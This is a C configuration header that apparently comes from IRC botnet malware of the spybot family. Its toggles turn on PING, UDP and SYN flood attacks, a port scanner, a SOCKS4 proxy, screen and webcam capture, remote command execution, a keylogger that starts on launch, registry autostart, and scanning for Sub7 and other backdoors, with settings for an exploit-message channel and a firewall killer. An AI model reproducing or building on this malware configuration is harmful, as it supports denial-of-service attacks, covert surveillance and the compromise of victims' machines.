/////////////////////////////////////////////////////////////////////////////////////////


 #define NO_IDENT      // disables ident server
// #define NO_NETINFO    // disables network info function
// #define NO_SYSINFO    // disables system info function
// #define NO_DOWNLOAD   // disables downloading/updating functions
// #define NO_CONNCHECK  // disables check for internet connection
// #define NO_BOTVERSION // disables bot version
// #define NO_SCAN       // disables port scanner
// #define NO_SECURE     // disables !secure
// #define NO_PING       // disables PING Flood
// #define NO_UDP        // disables UDP Flood
// #define NO_SYN        // disables SYN Flood
// #define NO_REDIRECT   // disables port redirect function
// #define NO_SOCK4SERV  // disables s0cks4 daemon functions
// #define NO_CAPTURE    // disables screen capture and webcam capture
// #define NO_HOSTAUTH   // disables Host auth
// #define NO_REMOTECMD  // disables Remote Cmd

// #define NO_SUB7
// #define NO_KUANG
// #define NO_DEVIL
// #define NO_OPTIX
 

//#define Use_Firewall_killer // comment to disable
#define Flood_delay 1000 //To prevent bots from flooding (in milliseconds)
#define MAX_PORTSCAN_SOCKETS_TO_USE 10 //max number of sockets to use with the spybot's portscanner
#define start_keylogger_afterstartup

const BOOL topiccmd = TRUE; // set to TRUE to enable topic commands
const BOOL rndfilename = FALSE; // use random file name 
const BOOL nopm = TRUE; //set to FALSE to login thru pm
const BOOL noprefix = FALSE; //set to TRUE to disable  prefix command (this will remove "." )
const BOOL AutoStart = TRUE; //regstart
const BOOL useexploitchan = FALSE; //the bots says all exploit msgs in exploitmsg channel

	